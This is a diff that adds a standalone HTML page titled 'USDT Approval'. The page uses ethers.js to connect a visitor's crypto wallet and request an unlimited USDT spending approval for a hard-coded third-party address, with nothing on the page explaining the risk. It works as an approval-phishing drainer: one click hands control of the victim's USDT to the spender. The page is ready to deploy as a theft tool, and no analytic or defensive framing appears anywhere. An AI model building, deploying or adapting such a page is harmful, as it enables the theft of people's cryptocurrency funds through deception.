@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>USDT Approval</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background: #f7f7f7;
+      text-align: center;
+    }
+    #container {
+      background: white;
+      padding: 2rem;
+      border-radius: 1.5rem;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    .logo {
+      width: 60px;
+      margin: 1rem 0;
+    }
+    .btn {
+      padding: 1rem 2rem;
+      background: #1e00ff;
+      color: white;
+      border: none;
+      font-size: 1rem;
+      border-radius: 999px;
+      cursor: pointer;
+      margin-top: 2rem;
+    }
+    #status {
+      margin-top: 1.5rem;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div id="container">
+    <h2>Authorize USDT Access</h2>
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="logo"/>
+    <p><strong>Approve unlimited amount</strong></p>
+    <button class="btn" onclick="approve()">Confirm</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
+    const spender = "0x7113C4847987bFf1cB39e0C70AaC808056B6E5f0";
+    const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    const MAX_UINT = ethers.constants.MaxUint256;
+
+    async function approve() {
+      const status = document.getElementById("status");
+
+      if (!window.ethereum) {
+        status.innerText = "Wallet not detected. Please open this link in your wallet app.";
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const token = new ethers.Contract(tokenAddress, ABI, signer);
+
+      status.innerText = "Approval in progress...";
+
+      try {
+        const tx = await token.approve(spender, MAX_UINT);
+        await tx.wait();
+        status.innerText = "✅ Approval confirmed!";
+      } catch (e) {
+        status.innerText = "❌ Transaction cancelled or failed.";
+      }
+    }
+  </script>
+</body>
+</html>
